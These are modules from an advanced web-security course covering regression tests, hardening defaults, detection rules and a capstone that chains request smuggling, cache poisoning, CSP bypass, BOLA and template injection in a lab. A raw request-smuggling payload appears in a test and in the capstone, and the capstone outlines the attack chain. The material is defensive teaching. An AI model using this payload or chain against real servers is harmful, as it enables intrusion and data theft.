A security fix without a regression test is a temporary fix. The goal is to encode the invariant that was violated so a future change cannot silently reintroduce the bug. The mental model is a test as an executable specification: it should fail against the vulnerable version and pass against the fixed version. Reducing an exploit to its invariant is the hard part; the noisy exploit payload is usually unnecessary.

Choose the layer that gives the fastest reliable signal. Parser and normalization bugs are best covered by unit tests. Authorization matrices need integration tests with two synthetic users. Protocol-level issues need harnesses that speak raw HTTP or H2. Property-based testing is valuable for normalization, because it can explore encodings you did not think of.

### Step-by-step method (lab only)
1. State the invariant in one sentence at <LAB_HOST>, such as "conflicting length headers are rejected."
2. Write a failing test that expresses the exploit at the smallest useful layer.
3. Confirm it fails against the vulnerable build.
4. Apply the fix and confirm the test passes.
5. Add positive cases to ensure legitimate traffic still works, then wire the suite into CI.

### Concrete example
```python
def test_conflicting_length_headers_rejected(client):
    raw = (b"POST / HTTP/1.1\r\nHost: <LAB_HOST>\r\n"
           b"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n")
    r = client.send_raw(raw)
    assert r.status_code == 400
```
An authorization matrix test:
```python
assert client_as_b.get("/api/users/1042/invoices").status_code == 403
```

| Bug class | Test layer |
|---|---|
| Encoding differential | Unit / property |
| BOLA matrix | Integration |
| Desync | Raw protocol harness |
| CSP | Browser-based check |

### Bypass and defense pairs
- Weak test: asserts a specific payload is blocked; strong test: asserts the invariant holds for a family of encodings.
- Weak test: checks response status only; strong test: checks persisted state and side effects.

### Additional surface
Keep tests fast and deterministic; a flaky security test will be disabled. Use synthetic identities and fixed clocks. Tag tests by invariant rather than by CVE so they remain meaningful after software updates.

### Common mistakes
- Testing only the exact exploit string.
- Forgetting legitimate traffic cases, causing false failures.
- Leaving security tests out of the normal CI pipeline.

### Knowledge check
**Q:** Why should a regression test assert an invariant instead of a specific payload?
**A:** Because variants of the same flaw use different payloads; an invariant catches the whole family.

===MODULE===
TITLE: Secure Defaults and Hardening Baselines
LEVEL: Advanced
MINUTES: 45
SUMMARY: Design configuration defaults that fail closed so developers do not have to remember to add security controls.
OBJECTIVES: Define a hardening baseline for web services | Turn off unsafe framework defaults | Add startup assertions
TAKEAWAYS: Defaults are policies applied when nobody decides | Fail-closed beats fail-open | Configuration is code and must be reviewed
PRACTICE: In a local app at <LAB_HOST>, enable a deny-by-default authorization policy and confirm unregistered routes return 403.
SOURCES: None
---
## Core idea
Secure defaults shift the burden from individual developers to the platform. A default is the policy that applies when nobody makes an explicit decision, so the safe choice should be automatic. Examples include deny-by-default authorization, framework autoescaping, strict XML parsers with external entities disabled, host-only cookies with prefixes, strict transport and framing headers, egress allowlists, and disabled debug endpoints.

The mental model is a baseline that every service inherits. Deviations require an explicit, reviewed exception. Without a baseline, security depends on each developer remembering each control on each endpoint, which fails at scale. Configuration files are therefore security artifacts: they deserve code review, version control, and tests just like source code.

### Step-by-step method (lab only)
1. Define a baseline checklist at <LAB_HOST> covering authz, parsing, headers, cookies, and logging.
2. Compare deployed configuration to the checklist and record gaps.
3. Disable debug modes, verbose errors, and unused endpoints.
4. Enable hardening headers and strict parser settings.
5. Add startup assertions that abort the process if a required control is missing.

### Concrete example
```text
Content-Security-Policy: default-src 'none'; script-src 'self'; frame-ancestors 'none'
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/
Cache-Control: no-store
```
A startup assertion might check that the authorization middleware is registered before the router.

| Default | Unsafe | Safe |
|---|---|---|
| Authorization | Allow by default | Deny by default |
| XML parsing | External entities on | Disabled |
| Errors | Verbose stack traces | Generic messages |
| Cookies | Host and domain wide | Host-only with prefix |

### Bypass and defense pairs
- Unsafe default: a framework that auto-binds all request fields; safe default: explicit allowlists for input binding.
- Unsafe default: permissive CORS reflection; safe default: static origin allowlist.

### Additional surface
Baselines must cover third-party components too: template engines, deserializers, and proxies each need safe settings. Automate the check so a new service cannot be deployed without inheriting it. Review exceptions periodically, since temporary debug settings tend to persist.

### Common mistakes
- Treating hardening as a one-time task.
- Allowing debug endpoints in production "just in case."
- Assuming framework defaults are secure without verification.

### Additional surface
Secure defaults also include dependency and deployment hygiene: pin versions, remove unused plugins, and disable directory listings. Review exception requests as security decisions, with an owner and expiry date. Automate a baseline scan so a service cannot be deployed without inheriting the controls.

### Knowledge check
**Q:** Why is fail-closed authorization preferable to fail-open?
**A:** Because an accidental omission denies access and is noticed, while fail-open silently exposes data.

===MODULE===
TITLE: Detection Engineering for Web Attacks
LEVEL: Advanced
MINUTES: 60
SUMMARY: Translate web attack techniques into observable log signals and build tuned, testable detections.
OBJECTIVES: Map attack primitives to telemetry | Write a detection with thresholds | Tune false positives safely
TAKEAWAYS: Every exploit leaves a trace at some layer | Choose the highest-signal telemetry source | Detections need tests like code
PRACTICE: In a local lab at <LAB_HOST>, generate harmless request patterns and verify that a detection rule fires on them.
SOURCES: None
---
## Core idea
Detection engineering turns knowledge of attack mechanics into alerts. The mental model is a trace map: every exploit leaves evidence somewhere  -  conflicting length headers at the proxy, unusual encodings at the WAF, authorization denials at the application, unusual child processes on the host. The best detection uses the layer where the signal is unambiguous and the event volume is manageable.

Start from a technique, not from a log field. For request smuggling, the observable is a request with two length signals or a response ordering anomaly. For BOLA, it is a high rate of object identifiers that do not belong to the authenticated user. For SSRF, it is outbound connections to internal ranges triggered by a request. Write a rule with explicit conditions and a threshold, then validate it with harmless lab traffic that mimics the attack.

### Step-by-step method (lab only)
1. Inventory telemetry at <LAB_HOST>: proxy logs, application logs, WAF events, and host process events.
2. For each attack primitive from earlier modules, list its observable event and source.
3. Write a detection with clear conditions and a volume threshold.
4. Generate harmless matching traffic in your lab and confirm the alert fires.
5. Tune by adding exclusions for known legitimate patterns, then re-test.

### Concrete example
```yaml
title: Conflicting request length headers
source: proxy_access_log
detection:
  selection:
    header_transfer_encoding: /chunked/i
    header_content_length: /./
  condition: selection
false_positive_filter:
  - upstream_rewrite: true
```
A BOLA detector might alert when one account requests more than N distinct object IDs in a short window.

| Technique | Signal | Source |
|---|---|---|
| Desync | Dual length headers | Proxy |
| SSRF | Internal outbound fetch | Egress logs |
| SSTI | Template error strings | App logs |
| BOLA | ID diversity per account | App logs |

### Bypass and defense pairs
- Attacker evasion: splitting headers across proxies; detection hardening: correlate at each hop.
- Attacker evasion: low-and-slow enumeration; detection hardening: statistical baselines over longer windows.

### Additional surface
Detections should be versioned and tested in CI alongside application code. Alert fatigue is a real failure mode: prefer a few high-confidence rules over many noisy ones. Include a runbook that tells responders what to check first.

### Common mistakes
- Building rules directly from raw logs without a threat model.
- Ignoring false positives until analysts disable the rule.
- Alerting on a signal that the application itself cannot observe.

### Knowledge check
**Q:** Why should detections be tied to attack primitives rather than log fields?
**A:** Because primitives describe what must be observable; starting from fields leads to rules that are noisy or miss the behavior.

===MODULE===
TITLE: Capstone: Chaining Five Web Vulnerabilities
LEVEL: Advanced
MINUTES: 90
SUMMARY: Synthesize the course by chaining a parser bug, cache poisoning, CSP bypass, object-level flaw, and server-side injection in a lab.
OBJECTIVES: Model vulnerabilities as capability primitives | Order a chain by preconditions | Document and verify each link
TAKEAWAYS: Each bug supplies a precondition for the next | Chains break at their weakest link | Defense can target any single link
PRACTICE: In a fully owned lab at <LAB_HOST>, build the five-step chain with harmless markers and document the evidence for each transition.
SOURCES: None
---
## Core idea
Real impact often comes from chaining. The mental model is a capability graph: each vulnerability provides a primitive, and each subsequent vulnerability requires a precondition that an earlier primitive satisfies. A request smuggling bug yields control over a shared cache entry. Cache poisoning yields attacker-controlled script on a trusted origin. A weak CSP permits that script to run. A BOLA flaw lets the script read another user's data or trigger a privileged endpoint. A server-side template injection on that endpoint turns data access into code execution.

The chain is only as strong as its least reliable link, so order matters. Choose steps that work deterministically and avoid relying on user interaction where possible. Each step must be verified independently before chaining; debugging a five-link chain without isolating links is painful and error-prone.

### Step-by-step method (lab only)
1. Enumerate the primitives available in your owned lab at <LAB_HOST> and their preconditions.
2. Order them so each step supplies what the next needs.
3. Verify each link in isolation with a harmless marker.
4. Combine the links, recording request and response evidence at each transition.
5. Write up the chain as a capability diagram and identify the single defense that would break it.

### Concrete example
```http
POST / HTTP/1.1
Host: <LAB_HOST>
Content-Length: 6
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
Host: <LAB_HOST>
X-Poison: marker
```
The poisoned script is served under a trusted origin, a reused nonce allows it to execute, it calls a BOLA-protected export endpoint, the export renderer injects a template, and the resulting process can reach an internal metadata service.

| Link | Primitive supplied | Next requirement |
|---|---|---|
| Desync | Cache write | Trusted origin content |
| CSP bypass | Script execution | Client-side call |
| BOLA | Cross-user data | Privileged input |
| SSTI | Code execution | Internal access |

### Bypass and defense pairs
- Chain-breaking defense: strict framing validation removes the first link, collapsing the chain.
- Chain-breaking defense: per-response nonces and no unkeyed cache inputs prevent attacker script from ever being trusted.

### Additional surface
Document alternatives: if one link is patched, is there a substitute? A mature assessment reports multiple paths to the same impact. Keep every test inside the owned lab and use harmless markers throughout.

### Common mistakes
- Assuming impact requires exploiting every link in a single request.
- Failing to verify each link independently.
- Stopping at the first interesting bug instead of following the capability graph.

### Knowledge check
**Q:** Why can one strong defense break an entire chain?
**A:** Because later links depend on a precondition supplied by an earlier one; removing that prerequisite makes the remaining steps unreachable.
